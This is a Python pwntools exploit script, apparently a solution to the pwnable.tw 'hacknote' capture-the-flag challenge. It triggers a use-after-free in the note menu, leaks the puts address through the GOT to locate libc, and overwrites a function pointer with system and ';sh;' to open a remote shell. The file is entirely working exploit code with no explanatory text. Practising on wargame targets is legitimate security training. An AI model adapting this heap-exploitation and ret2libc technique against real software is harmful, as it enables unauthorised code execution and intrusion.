from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./hacknote')
#
io = connect('chall.pwnable.tw',10102)
elf=ELF('./hacknote')
libc=ELF('./libc_32.so.6')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)
def lsc(s):
	log.success(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]

def add(size,content):
	ru('Your choice :')
	sl('1')
	ru('Note size :')
	sl(str(size))
	ru('Content :')
	sl(content)

def dlt(index):
	ru('Your choice :')
	sl('2')
	ru('Index :')
	sl(str(index))

def show(index):
	ru('Your choice :')
	sl('3')
	ru('Index :')
	sl(str(index))

tp=0x0804862b
pg=got('puts')
add(32,'aaa')# 0
add(32,'bbb')# 1
dlt(0)
dlt(1)

add(8,p32(tp)+p32(pg))# 2
show(0)
pr=u32(io.recvuntil('\xf7')[-4:])
lsc('real puts addr: '+hex(pr))
lb=pr-libc.sym['puts']
lsc('libc base addr: '+hex(lb))
sa=lb+libc.sym['system']
lsc('system addr: '+hex(sa))

dlt(2)
add(8,p32(sa)+b';sh;')
show(0)

#
io.interactive()
